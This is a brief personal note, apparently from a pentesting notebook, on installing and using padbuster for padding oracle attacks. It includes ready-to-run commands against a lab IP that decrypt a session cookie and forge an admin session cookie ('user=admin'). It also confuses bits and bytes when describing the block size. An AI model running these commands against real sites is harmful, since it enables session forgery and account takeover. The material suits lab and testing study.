
> apt install padbuster

This tool is used for [[Padding Oracle Attack]] 

----

# Sintaxis

````bash
padbuster URL EncryptedSample/cookie... BlockSize options
````

````bash
padbuster http://192.168.1.36/index.php hbp%2FIzE9synu9M0rpNy3qNz5srXJ4sow 8 -cookies 'auth=hbp%2FIzE9synu9M0rpNy3qNz5srXJ4sow'
````

Block size --> In encrypt CBC the size of the block **have to be a multiple of eight bits**, one byte

---

## Create a encrypt message

In this case we are going to create a new cookie session indicate that the user is admin, we can do this because we decrypt this before and we see how this works:

````bash
padbuster http://192.168.1.36/index.php hbp%2FIzE9synu9M0rpNy3qNz5srXJ4sow 8 -cookies 'auth=hbp%2FIzE9synu9M0rpNy3qNz5srXJ4sow' -plaintext 'user=admin'
````

---
# Tags

#tools #padbuster

---
